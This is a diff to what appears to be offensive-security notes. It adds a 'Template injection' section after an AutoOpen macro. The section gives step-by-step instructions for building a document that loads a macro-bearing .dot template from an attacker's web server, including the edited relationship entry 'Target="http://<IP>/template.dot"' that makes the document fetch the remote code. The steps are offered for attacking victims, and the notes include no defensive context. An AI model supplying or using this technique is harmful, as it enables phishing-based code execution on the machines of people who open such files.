@@ -195,3 +195,11 @@ Sub AutoOpen()
 
 End Sub
 ```
+
+### Template injection
+- Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.
+1. Create a word document with prefered macro. Save it as `.dot` Word 97-2003 Template (*.dot) file.`
+2. Host the template on a webserver for example `http://<IP>/template.dot`
+3. Create a new document with the template and save it as `.docx`.
+4. Browse to the directory in Windows explorer, right-click and select 7-Zip > Open archive. Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
+5. Change the target entry from the one pointing to the local file to the hosted template on the webserver. `Target="http://<IP>/template.dot"`
